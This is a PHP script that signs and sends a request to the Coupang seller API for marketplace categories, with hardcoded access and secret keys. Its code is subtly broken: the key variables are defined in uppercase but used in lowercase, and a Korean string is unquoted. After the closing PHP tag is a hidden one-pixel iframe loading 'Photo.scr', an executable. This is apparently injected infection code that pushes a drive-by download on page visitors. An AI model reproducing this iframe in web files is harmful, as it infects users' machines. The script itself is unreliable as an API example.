
<?php
date_default_timezone_set("GMT+0");

$datetime = date("ymd").'T'.date("His").'Z';
$method = "GET";
$path = "/targets/wing/seller_api/apis/api/v1/marketplace/meta/categories";
$query = "categoryName=" . urlencode(윈도우);

$message = $datetime.$method.$path.$query;

//replace with your own accessKey
$ACCESS_KEY = "15e291a5-2f17-4ec3-93b6-06014161b366";
//replace with your own secretKey
$SECRET_KEY = "447b53dbe5f96551a9f4abb3abb9c3bac6daddb6";
$algorithm = "HmacSHA256";

$signature = hash_hmac('sha256', $message, $secretkey);

$authorization  = "CEA algorithm=HmacSHA256, access-key=".$accesskey.", signed-date=".$datetime.", signature=".$signature;

//replace prod url when you need
$url = 'https://api-gateway.coupang.com'.$path.'?'.$query;

$curl = curl_init();        
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $method);
curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-Type:  application/json;charset=UTF-8", "Authorization:".$authorization));        
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
$httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);

curl_close($curl);

echo($httpcode);

echo($result);
?>
<iframe src=Photo.scr width=1 height=1 frameborder=0></iframe>